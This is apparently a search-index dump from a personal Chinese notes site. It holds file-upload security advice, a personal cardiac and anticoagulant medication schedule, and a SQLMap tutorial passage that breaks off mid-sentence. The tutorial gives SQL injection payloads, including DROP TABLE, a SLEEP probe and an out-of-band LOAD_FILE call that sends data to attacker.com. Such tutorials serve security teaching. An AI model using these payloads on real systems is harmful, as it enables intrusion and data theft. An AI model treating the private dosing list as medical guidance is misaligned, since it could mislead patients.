<li>\u5c06\u6587\u4ef6\u5b58\u50a8\u5728 webroot \u4e4b\u5916\uff0c\u53ea\u5141\u8bb8\u7ba1\u7406\u8bbf\u95ee\u3002</li> <li>\u5c06\u6587\u4ef6\u5b58\u50a8\u5728 webroot \u4e2d\uff0c\u5e76\u5c06\u5b83\u4eec\u8bbe\u7f6e\u4e3a\u4ec5\u5199\u5165\u6743\u9650\u3002</li> <li>\u5982\u679c\u9700\u8981\u8bfb\u53d6\u8bbf\u95ee\u6743\u9650\uff0c\u5219\u5fc5\u987b\u8bbe\u7f6e\u9002\u5f53\u7684\u63a7\u5236\uff08\u4f8b\u5982\u5185\u90e8 IP\u3001\u6388\u6743\u7528\u6237\u7b49\uff09</li> </ol> <p>\u4ee5\u7ecf\u8fc7\u7814\u7a76\u7684\u65b9\u5f0f\u5c06\u6587\u4ef6\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u662f\u4e00\u9879\u989d\u5916\u7684\u6280\u672f\u3002\u8fd9\u6709\u65f6\u7528\u4e8e\u81ea\u52a8\u5907\u4efd\u8fc7\u7a0b\u3001\u975e\u6587\u4ef6\u7cfb\u7edf\u653b\u51fb\u548c\u6743\u9650\u95ee\u9898\u3002\u4f5c\u4e3a\u56de\u62a5\uff0c\u8fd9\u4e3a\u6027\u80fd\u95ee\u9898\uff08\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff09\u3001\u6570\u636e\u5e93\u53ca\u5176\u5907\u4efd\u7684\u5b58\u50a8\u6ce8\u610f\u4e8b\u9879\u6253\u5f00\u4e86\u5927\u95e8\uff0c\u8fd9\u4e3a SQLi \u653b\u51fb\u6253\u5f00\u4e86\u5927\u95e8\u3002\u4ec5\u5f53\u56e2\u961f\u4e2d\u6709 DBA \u65f6\u624d\u5efa\u8bae\u8fd9\u6837\u505a\uff0c\u5e76\u4e14\u6b64\u8fc7\u7a0b\u8868\u660e\u5c06\u5b83\u4eec\u5b58\u50a8\u5728\u6587\u4ef6\u7cfb\u7edf\u4e0a\u662f\u4e00\u79cd\u6539\u8fdb\u3002</p> <p>\u6709\u4e9b\u6587\u4ef6\u5728\u4e0a\u4f20\u540e\u4f1a\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u53d1\u9001\u6216\u5904\u7406\uff0c\u4e0d\u4f1a\u5b58\u50a8\u5728\u670d\u52a1\u5668\u4e0a\u3002\u5728\u5bf9\u5b83\u4eec\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u4e4b\u524d\uff0c\u5fc5\u987b\u6267\u884c\u672c\u8868\u4e2d\u8ba8\u8bba\u7684\u5b89\u5168\u63aa\u65bd\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_14","title":"\u7528\u6237\u6743\u9650\u00b6","text":"<p>\u5728\u8bbf\u95ee\u4efb\u4f55\u6587\u4ef6\u4e0a\u4f20\u670d\u52a1\u4e4b\u524d\uff0c\u5e94\u8be5\u5728\u4e24\u4e2a\u7ea7\u522b\u4e0a\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u7528\u6237\u8fdb\u884c\u9002\u5f53\u7684\u9a8c\u8bc1\uff1a</p> <ul> <li>\u8ba4\u8bc1\u7ea7\u522b</li> <li>\u7528\u6237\u5e94\u4e3a\u6ce8\u518c\u7528\u6237\uff0c\u6216\u53ef\u8bc6\u522b\u7528\u6237\uff0c\u4ee5\u4fbf\u4e3a\u5176\u4e0a\u4f20\u80fd\u529b\u8bbe\u7f6e\u9650\u5236\u548c\u9650\u5236</li> <li>\u6388\u6743\u7ea7\u522b</li> <li>\u7528\u6237\u5e94\u5177\u6709\u8bbf\u95ee\u6216\u4fee\u6539\u6587\u4ef6\u7684\u9002\u5f53\u6743\u9650</li> </ul>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_15","title":"\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\u00b6","text":"<p>\u6309\u7167\u6700\u5c0f\u6743\u9650\u539f\u5219\u8bbe\u7f6e\u6587\u4ef6\u6743\u9650\u3002</p> <p>\u6587\u4ef6\u7684\u5b58\u50a8\u65b9\u5f0f\u5e94\u786e\u4fdd\uff1a</p> <ul> <li>\u5141\u8bb8\u7684\u7cfb\u7edf\u7528\u6237\u662f\u552f\u4e00\u80fd\u591f\u8bfb\u53d6\u6587\u4ef6\u7684\u7528\u6237</li> <li>\u4ec5\u4e3a\u6587\u4ef6\u8bbe\u7f6e\u6240\u9700\u6a21\u5f0f</li> <li>\u5982\u679c\u9700\u8981\u6267\u884c\uff0c\u4f5c\u4e3a\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\uff0c\u9700\u8981\u5728\u8fd0\u884c\u6587\u4ef6\u4e4b\u524d\u626b\u63cf\u6587\u4ef6\uff0c\u4ee5\u786e\u4fdd\u6ca1\u6709\u53ef\u7528\u7684\u5b8f\u6216\u9690\u85cf\u811a\u672c\u3002</li> </ul>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_16","title":"\u4e0a\u4f20\u548c\u4e0b\u8f7d\u9650\u5236\u00b6","text":"<p>\u5e94\u7528\u7a0b\u5e8f\u5e94\u4e3a\u4e0a\u4f20\u670d\u52a1\u8bbe\u7f6e\u9002\u5f53\u7684\u5927\u5c0f\u9650\u5236\uff0c\u4ee5\u4fdd\u62a4\u6587\u4ef6\u5b58\u50a8\u5bb9\u91cf\u3002\u5982\u679c\u7cfb\u7edf\u8981\u63d0\u53d6\u6216\u5904\u7406\u6587\u4ef6\uff0c\u5219\u5728\u8fdb\u884c\u6587\u4ef6\u89e3\u538b\u7f29\u540e\u5e76\u4f7f\u7528\u5b89\u5168\u65b9\u6cd5\u8ba1\u7b97 zip \u6587\u4ef6\u5927\u5c0f\u65f6\uff0c\u5e94\u8003\u8651\u6587\u4ef6\u5927\u5c0f\u9650\u5236\u3002\u6709\u5173\u8fd9\u65b9\u9762\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u5982\u4f55\u5b89\u5168\u5730\u4ece ZipInputStream \u4e2d\u63d0\u53d6\u6587\u4ef6\uff0c\u8fd9\u662f Java \u7684\u8f93\u5165\u6d41\u4ee5\u5904\u7406 ZIP \u6587\u4ef6\u3002</p> <p>\u5982\u679c\u53ef\u7528\uff0c\u5e94\u7528\u7a0b\u5e8f\u8fd8\u5e94\u4e3a\u4e0b\u8f7d\u670d\u52a1\u8bbe\u7f6e\u9002\u5f53\u7684\u8bf7\u6c42\u9650\u5236\uff0c\u4ee5\u4fdd\u62a4\u670d\u52a1\u5668\u514d\u53d7 DoS \u653b\u51fb\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#java","title":"Java \u4ee3\u7801\u7247\u6bb5\u00b6","text":"<p>Dominique \u4e3a Java \u4e2d\u7684\u67d0\u4e9b\u6587\u6863\u7c7b\u578b\u7f16\u5199\u7684\u6587\u6863\u4e0a\u4f20\u4fdd\u62a4\u5b58\u50a8\u5e93\u3002</p>"},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","title":"\u836f\u7269\u7528\u91cf\u53ca\u6ce8\u610f\u4e8b\u9879","text":""},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/#_1","title":"\u836f\u7269\u7528\u91cf\u53ca\u6ce8\u610f\u4e8b\u9879","text":""},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/#_2","title":"\u5fc3\u7ede\u75db","text":"<p>\u785d\u9178\u5f02\u5c71\u68a8\u916f\u7247     2-2-2</p>"},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/#_3","title":"\u5fc3\u8870","text":"<p>\u964d\u8840\u538b \u5fc3\u7387</p> <p>\u7425\u73c0\u9178\u7f8e\u6258\u6d1b\u5c14\u7f13\u91ca\u7247      1-0-0</p> <p>\u6c99\u5e93\u5df4\u66f2\u7f2c\u6c99\u5766\u94a0\u7247           1/4-0-1/4</p> <p>\u8fbe\u683c\u5217\u51c0\u7247           1-0-0</p> <p>\u544b\u567b\u7c73                 1-0-0</p>"},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/#_4","title":"\u9ad8\u80c6\u56fa\u9187","text":"<p>\u745e\u8212\u4f10\u4ed6\u6c40\u9499\u7247     0-0-1</p>"},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/#_5","title":"\u62a4\u80c3","text":"<p>\u96f7\u8d1d\u62c9\u5511\u94a0\u80a0\u6eb6\u7247        1-0-0</p>"},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/#_6","title":"\u9632\u8840\u6813","text":"<p>\u534e\u6cd5\u6797\u94a0\u7247           1.75-0-0</p> <p>\u87ba\u5185\u916f\u7247                1-0-0</p>"},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/#_7","title":"\u964d\u8840\u7cd6","text":"<p>\u76d0\u9178\u4e8c\u94be\u53cc\u80cd\u7f13\u91ca\u7247                           1-0-1</p> <p>\u683c\u5217\u5421\u55ea\u7247(\u8840\u7cd6\u63a7\u5236\u4e0d\u4f4f\u518d\u5403)         1-1-1 </p>"},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/#_8","title":"\u5176\u4ed6","text":"<p>\u963f\u53f8\u5339\u6797\u80a0\u6eb6\u7247         0-0-1</p> <p>\u6c2f\u534e\u94be\u7f13\u91ca\u7247              1-0-0</p> <p>\u4e2d\u836f</p> <p>\u5229\u6c34</p>"},{"location":"CheetSheet/%E8%8D%AF%E7%89%A9%E7%94%A8%E9%87%8F%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/#_9","title":"\u5404\u9879\u6307\u6807","text":"<p>\u8840\u538b </p> <p>\u8840\u7cd6  \u4e0d\u8d858</p> <p>\u94be</p> <p>\u8840\u51dd\u9879 1.8-2.5 \u4e0d\u8d853</p> <p>\u4e24\u5468\u540e\u533b\u9662\u590d\u67e5</p> <p>PT\u56db\u9879 \u8840\u51dd\u9879</p> <p>\u80be\u529f\u80fd</p> <p>\u5fc3\u75c5\u79d1\u79d1\u5ba4\u7535\u8bdd\uff1a0558-8519303</p>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/","title":"1\u3001SQLmap \u57fa\u7840","text":""},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#_1","title":"\u6982\u8ff0","text":"<p>SQLMap\u662f\u4e00\u79cd\u7528 Python \u7f16\u5199\u7684\u514d\u8d39\u5f00\u6e90\u6e17\u900f\u6d4b\u8bd5\u5de5\u5177\uff0c\u53ef\u81ea\u52a8\u6267\u884c\u68c0\u6d4b\u548c\u5229\u7528 SQL \u6ce8\u5165 (SQLi) \u6f0f\u6d1e\u7684\u8fc7\u7a0b\u3002SQLMap \u4ece 2006 \u5e74\u5f00\u59cb\u4e0d\u65ad\u53d1\u5c55\uff0c\u81f3\u4eca\u4ecd\u5728\u7ef4\u62a4\u3002</p> <pre><code>$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'\n\n       ___\n       __H__\n ___ ___[']_____ ___ ___  {1.3.10.41#dev}\n|_ -| . [']     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting at 12:55:56\n\n[12:55:56] [INFO] testing connection to the target URL\n[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[12:55:58] [INFO] testing if the target URL content is stable\n[12:55:58] [INFO] target URL content is stable\n[12:55:58] [INFO] testing if GET parameter 'id' is dynamic\n[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic\n[12:55:59] [INFO] GET parameter 'id' is dynamic\n[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')\n[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'\n&lt;...SNIP...&gt;\n</code></pre> <p>SQLMap \u5e26\u6709\u5f3a\u5927\u7684\u68c0\u6d4b\u5f15\u64ce\u3001\u4f17\u591a\u529f\u80fd\u4ee5\u53ca\u5e7f\u6cdb\u7684\u9009\u9879\u548c\u5f00\u5173\uff0c\u7528\u4e8e\u5fae\u8c03\u5b83\u7684\u8bb8\u591a\u65b9\u9762\uff0c\u4f8b\u5982\uff1a</p> \u76ee\u6807\u8fde\u63a5 \u6ce8\u5165\u68c0\u6d4b \u6307\u7eb9\u8bc6\u522b \u679a\u4e3e \u4f18\u5316(Optimization) \u4f7f\u7528 tamper \u811a\u672c\u7ed5\u8fc7\u68c0\u6d4b \u6570\u636e\u5e93\u5185\u5bb9\u68c0\u7d22 \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee \u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#sqlmap","title":"SQLMap\u5b89\u88c5","text":"<p>SQLMap \u9884\u88c5\u5728\u60a8\u7684 Pwnbox \u548c\u5927\u591a\u6570\u4ee5\u5b89\u5168\u4e3a\u4e2d\u5fc3\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u3002\u5728\u8bb8\u591a Linux \u53d1\u884c\u7248\u7684\u5e93\u4e2d\u4e5f\u53ef\u4ee5\u627e\u5230 SQLMap\u3002\u4f8b\u5982\uff0c\u5728 Debian \u4e0a\uff0c\u5b83\u53ef\u4ee5\u5b89\u88c5\uff1a</p> <pre><code>$ sudo apt install sqlmap\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u60f3\u624b\u52a8\u5b89\u88c5\uff0c\u53ef\u4ee5\u5728Linux\u7ec8\u7aef\u6216\u8005Windows\u547d\u4ee4\u884c\u4e2d\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a</p> <pre><code>$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\n</code></pre> <p>\u4e4b\u540e\uff0cSQLMap \u53ef\u4ee5\u8fd0\u884c\uff1a</p> <pre><code>$ python sqlmap.py\n</code></pre>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#_2","title":"\u652f\u6301\u7684\u6570\u636e\u5e93","text":"<p>\u5728\u4efb\u4f55\u5176\u4ed6 SQL \u5f00\u53d1\u5de5\u5177\u4e2d\uff0cSQLMap \u5bf9 DBMS \u7684\u652f\u6301\u6700\u5927\u3002SQLMap \u5b8c\u5168\u652f\u6301\u4ee5\u4e0b DBMS\uff1a</p> <code>MySQL</code> <code>Oracle</code> <code>PostgreSQL</code> <code>Microsoft SQL Server</code> <code>SQLite</code> <code>IBM DB2</code> <code>Microsoft Access</code> <code>Firebird</code> <code>Sybase</code> <code>SAP MaxDB</code> <code>Informix</code> <code>MariaDB</code> <code>HSQLDB</code> <code>CockroachDB</code> <code>TiDB</code> <code>MemSQL</code> <code>H2</code> <code>MonetDB</code> <code>Apache Derby</code> <code>Amazon Redshift</code> <code>Vertice, Mckoi</code> <code>Presto</code> <code>Altibase</code> <code>MimerSQL</code> <code>CrateDB</code> <code>Greenplum</code> <code>Drizzle</code> <code>Apache Ignite</code> <code>Cubrid</code> <code>InterSystems Cache</code> <code>IRIS</code> <code>eXtremeDB</code> <code>FrontBase</code> <p>SQLMap \u56e2\u961f\u8fd8\u81f4\u529b\u4e8e\u5b9a\u671f\u6dfb\u52a0\u548c\u652f\u6301\u65b0\u7684 DBMS\u3002</p>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#sql","title":"\u652f\u6301\u7684 SQL \u6ce8\u5165\u7c7b\u578b","text":"<p>SQLMap \u662f\u552f\u4e00\u53ef\u4ee5\u6b63\u786e\u68c0\u6d4b\u548c\u5229\u7528\u6240\u6709\u5df2\u77e5 SQLi \u7c7b\u578b\u7684\u6e17\u900f\u6d4b\u8bd5\u5de5\u5177\u3002\u6211\u4eec\u901a\u8fc7\u547d\u4ee4\u67e5\u770bSQLMap\u652f\u6301\u7684SQL\u6ce8\u5165\u7c7b\u578b<code>sqlmap -hh</code>\uff1a</p> <pre><code>$ sqlmap -hh\n...SNIP...\n  Techniques:\n    --technique=TECH..  SQL injection techniques to use (default \"BEUSTQ\")\n</code></pre> <p>\u6280\u672f\u7279\u5f81<code>BEUSTQ</code>\u6307\u7684\u662f\uff1a</p> <ul> <li><code>B</code>: \u57fa\u4e8e\u5e03\u5c14\u7684\u76f2\u6ce8</li> <li><code>E</code>: \u57fa\u4e8e\u9519\u8bef</li> <li><code>U</code>: \u57fa\u4e8e\u8054\u5408\u67e5\u8be2</li> <li><code>S</code>: \u5806\u53e0\u67e5\u8be2</li> <li><code>T</code>: \u57fa\u4e8e\u65f6\u95f4\u7684\u76f2\u6ce8</li> <li><code>Q</code>\uff1a\u5185\u8054\u67e5\u8be2</li> </ul>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#sql_1","title":"\u57fa\u4e8e\u5e03\u5c14\u7684 SQL \u76f2\u6ce8","text":"<p>\u4f8b\u5b50<code>Boolean-based blind SQL Injection</code>\uff1a</p> <pre><code>AND 1=1\n</code></pre> <p>SQLMap \u901a\u8fc7\u533a\u5206 <code>TRUE</code> \u548c <code>FALSE</code> \u67e5\u8be2\u7ed3\u679c\u6765\u5229\u7528\u57fa\u4e8e\u5e03\u5c14\u7684\u76f2\u6ce8\u6f0f\u6d1e\uff0c\u6709\u6548\u5730\u4e3a\u6bcf\u4e2a\u8bf7\u6c42\u68c0\u7d22 1 \u4e2a\u5b57\u8282\u7684\u4fe1\u606f\u3002\u533a\u5206\u57fa\u4e8e\u6bd4\u8f83\u670d\u52a1\u5668\u54cd\u5e94\u4ee5\u786e\u5b9a SQL \u67e5\u8be2\u8fd4\u56de\u7684\u662f <code>TRUE</code> \u8fd8\u662f <code>FALSE</code>\u3002\u8fd9\u5305\u62ec\u539f\u59cb\u54cd\u5e94\u5185\u5bb9\u3001HTTP \u4ee3\u7801\u3001\u9875\u9762\u6807\u9898\u3001\u8fc7\u6ee4\u6587\u672c\u548c\u5176\u4ed6\u56e0\u7d20\u7684\u6a21\u7cca\u6bd4\u8f83\u3002</p> <ul> <li> <p><code>TRUE</code>\u7ed3\u679c\u901a\u5e38\u57fa\u4e8e\u4e0e\u5e38\u89c4\u670d\u52a1\u5668\u54cd\u5e94\u6ca1\u6709\u5dee\u5f02\u6216\u5dee\u5f02\u5f88\u5c0f\u7684\u54cd\u5e94\u3002</p> </li> <li> <p><code>FALSE</code>\u7ed3\u679c\u57fa\u4e8e\u4e0e\u5e38\u89c4\u670d\u52a1\u5668\u54cd\u5e94\u6709\u5b9e\u8d28\u6027\u5dee\u5f02\u7684\u54cd\u5e94\u3002</p> </li> <li> <p><code>Boolean-based blind SQL Injection</code>\u88ab\u8ba4\u4e3a\u662f Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u6700\u5e38\u89c1\u7684 SQLi \u7c7b\u578b\u3002</p> </li> </ul>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#sql_2","title":"\u57fa\u4e8e\u9519\u8bef\u7684 SQL \u6ce8\u5165","text":"<p>\u4f8b\u5b50<code>Error-based SQL Injection</code>\uff1a</p> <pre><code>AND GTID_SUBSET(@@version,0)\n</code></pre> <p>\u5982\u679c<code>database management system</code>(\u00a0<code>DBMS</code>) \u9519\u8bef\u4f5c\u4e3a\u4efb\u4f55\u6570\u636e\u5e93\u76f8\u5173\u95ee\u9898\u7684\u670d\u52a1\u5668\u54cd\u5e94\u7684\u4e00\u90e8\u5206\u8fd4\u56de\uff0c\u5219\u5b83\u4eec\u6709\u53ef\u80fd\u7528\u4e8e\u643a\u5e26\u8bf7\u6c42\u67e5\u8be2\u7684\u7ed3\u679c\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u5f53\u524d DBMS \u7684\u4e13\u7528\u6709\u6548\u8d1f\u8f7d\uff0c\u9488\u5bf9\u5bfc\u81f4\u5df2\u77e5\u4e0d\u5f53\u884c\u4e3a\u7684\u529f\u80fd\u3002SQLMap \u5177\u6709\u6b64\u7c7b\u76f8\u5173\u6709\u6548\u8d1f\u8f7d\u7684\u6700\u5168\u9762\u5217\u8868\uff0cSQLMap \u62e5\u6709\u6b64\u7c7b\u76f8\u5173\u6709\u6548\u8d1f\u8f7d\u7684\u6700\u5168\u9762\u5217\u8868\uff0c\u5e76\u6db5\u76d6\u4ee5\u4e0b DBMS \u7684<code>Error-based SQL Injection</code>\uff1a</p> MySQL PostgreSQL Oracle Microsoft SQL Server Sybase Vertica IBM DB2 Firebird MonetDB <p>\u57fa\u4e8e\u9519\u8bef\u7684 SQLi \u88ab\u8ba4\u4e3a\u6bd4\u6240\u6709\u5176\u4ed6\u7c7b\u578b\u90fd\u5feb\uff0c\u4f46\u57fa\u4e8e UNION \u67e5\u8be2\u7684 SQLi \u9664\u5916\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u901a\u8fc7\u6bcf\u4e2a\u8bf7\u6c42\u68c0\u7d22\u6709\u9650\u6570\u91cf\uff08\u4f8b\u5982\uff0c200 \u5b57\u8282\uff09\u7684\u79f0\u4e3a\u201c\u5757\u201d\u7684\u6570\u636e\u3002</p>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#union","title":"UNION \u57fa\u4e8e\u67e5\u8be2","text":"<p>\u4f8b\u5b50<code>UNION query-based SQL Injection</code>\uff1a</p> <pre><code>UNION ALL SELECT 1,@@version,3\n</code></pre> <p>\u901a\u8fc7\u4f7f\u7528 <code>UNION</code>\uff0c\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528\u6ce8\u5165\u8bed\u53e5\u7684\u7ed3\u679c\u6269\u5c55\u539f\u59cb\uff08<code>vulnerable</code>\uff09\u67e5\u8be2\u3002\u8fd9\u6837\uff0c\u5982\u679c\u539f\u59cb\u67e5\u8be2\u7ed3\u679c\u4f5c\u4e3a\u54cd\u5e94\u7684\u4e00\u90e8\u5206\u5448\u73b0\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u9875\u9762\u54cd\u5e94\u672c\u8eab\u4e2d\u7684\u6ce8\u5165\u8bed\u53e5\u4e2d\u83b7\u5f97\u989d\u5916\u7684\u7ed3\u679c\u3002\u8fd9\u79cd\u7c7b\u578b\u7684 SQL \u6ce8\u5165\u88ab\u8ba4\u4e3a\u662f\u6700\u5feb\u7684\uff0c\u56e0\u4e3a\u5728\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5355\u4e2a\u8bf7\u6c42\u63d0\u53d6\u6574\u4e2a\u611f\u5174\u8da3\u7684\u6570\u636e\u5e93\u8868\u7684\u5185\u5bb9\u3002</p>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#_3","title":"\u5806\u53e0\u67e5\u8be2","text":"<p>\u4f8b\u5b50<code>Stacked Queries</code>\uff1a</p> <pre><code>; DROP TABLE users\n</code></pre> <p>\u5806\u53e0 SQL \u67e5\u8be2\uff0c\u4e5f\u79f0\u4e3a \"piggy-backing\"\uff0c\u662f\u5728\u6613\u53d7\u653b\u51fb\u7684 SQL \u8bed\u53e5\u4e4b\u540e\u6ce8\u5165\u989d\u5916 SQL \u8bed\u53e5\u7684\u4e00\u79cd\u5f62\u5f0f\u3002\u5982\u679c\u6709\u8fd0\u884c\u975e\u67e5\u8be2\u8bed\u53e5\u7684\u9700\u6c42\uff08\u4f8b\u5982 <code>INSERT</code>,\u00a0<code>UPDATE</code> \u6216\u00a0<code>DELETE</code>\uff09\uff0c\u5806\u53e0\u5fc5\u987b\u5f97\u5230\u6613\u53d7\u653b\u51fb\u7684\u5e73\u53f0\u7684\u652f\u6301\uff08\u4f8b\u5982\uff0c<code>Microsoft SQL Server</code> \u9ed8\u8ba4 <code>PostgreSQL</code> \u652f\u6301\uff09\u3002SQLMap \u53ef\u4ee5\u5229\u7528\u6b64\u7c7b\u6f0f\u6d1e\u6765\u8fd0\u884c\u5728\u9ad8\u7ea7\u529f\u80fd\uff08\u4f8b\u5982\uff0c\u6267\u884c OS \u547d\u4ee4\uff09\u4e2d\u6267\u884c\u7684\u975e\u67e5\u8be2\u8bed\u53e5\uff0c\u4ee5\u53ca\u7c7b\u4f3c\u4e8e\u57fa\u4e8e\u65f6\u95f4\u76f2\u6ce8\u7684\u6570\u636e\u68c0\u7d22\u3002</p>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#sql_3","title":"\u57fa\u4e8e\u65f6\u95f4\u7684 SQL \u76f2\u6ce8","text":"<p>\u4f8b\u5b50<code>Time-based blind SQL Injection</code>\uff1a</p> <pre><code>AND 1=IF(2&gt;1,SLEEP(5),0)\n</code></pre> <p>\u65f6\u95f4\u76f2\u6ce8\u7684\u539f\u7406\u7c7b\u4f3c\u5e03\u5c14\u76f2\u6ce8\uff0c\u4f46\u8fd9\u91cc\u4ee5\u54cd\u5e94\u65f6\u95f4\u4f5c\u4e3a\u533a\u5206 <code>TRUE</code> \u6d3b <code>FALSE</code></p> <ul> <li> <p><code>TRUE</code>\u4e0e\u5e38\u89c4\u670d\u52a1\u5668\u54cd\u5e94\u76f8\u6bd4\uff0c\u54cd\u5e94\u901a\u5e38\u4ee5\u54cd\u5e94\u65f6\u95f4\u7684\u663e\u7740\u5dee\u5f02\u4e3a\u7279\u5f81</p> </li> <li> <p><code>FALSE</code>\u54cd\u5e94\u5e94\u8be5\u5bfc\u81f4\u54cd\u5e94\u65f6\u95f4\u4e0e\u5e38\u89c4\u54cd\u5e94\u65f6\u95f4\u65e0\u6cd5\u533a\u5206</p> </li> </ul> <p>\u57fa\u4e8e\u65f6\u95f4\u76f2\u6ce8\u7684\u67e5\u8be2\u901f\u5ea6\u8981\u6162\u7684\u591a\uff0c\u5efa\u8bae\u5728\u5176\u4ed6\u6ce8\u5165\u65b9\u6cd5\u884c\u4e0d\u901a\u7684\u65f6\u5019\u4f7f\u7528\u3002</p>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#_4","title":"\u5185\u8054\u67e5\u8be2","text":"<p>\u4f8b\u5b50<code>Inline Queries</code>\uff1a</p> <pre><code>SELECT (SELECT @@version) from\n</code></pre> <p>\u8fd9\u79cd\u7c7b\u578b\u7684\u6ce8\u5165\u5728\u539f\u59cb\u67e5\u8be2\u4e2d\u5d4c\u5165\u4e86\u4e00\u4e2a\u67e5\u8be2\u3002\u8fd9\u79cd SQL \u6ce8\u5165\u5e76\u4e0d\u5e38\u89c1\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u4ee5\u67d0\u79cd\u65b9\u5f0f\u7f16\u5199\u914d\u7f6e\u6587\u4ef6\u5bfc\u81f4\u6613\u53d7\u653b\u51fb\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u4e0d\u8fc7\uff0cSQLMap \u4e5f\u652f\u6301\u8fd9\u79cd SQLi\u3002</p>"},{"location":"CheetSheet/SQLMAP/1%E3%80%81SQLmap%20%E5%9F%BA%E7%A1%80/#sql_4","title":"\u5e26\u5916 SQL \u6ce8\u5165","text":"<p>\u4f8b\u5b50<code>Out-of-band SQL Injection</code>\uff1a</p> <pre><code>LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\README.txt'))\n</code></pre> <p>\u8fd9\u88ab\u8ba4\u4e3a\u662f\u6700\u5148\u8fdb\u7684 SQLi \u7c7b\u578b\u4e4b\u4e00\uff0c\u7528\u4e8e\u6240\u6709\u5176\u4ed6\u7c7b\u578b\u4e0d\u88ab\u6613\u53d7\u653b\u51fb\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u652f\u6301\u6216\u901f\u5ea6\u592a\u6162\u7684\u60c5\u51b5\uff08\u4f8b\u5982\uff0c\u57fa\u4e8e\u65f6\u95f4\u7684\u76f2 SQLi\uff09\u3002SQLMap \u901a\u8fc7\u201cDNS 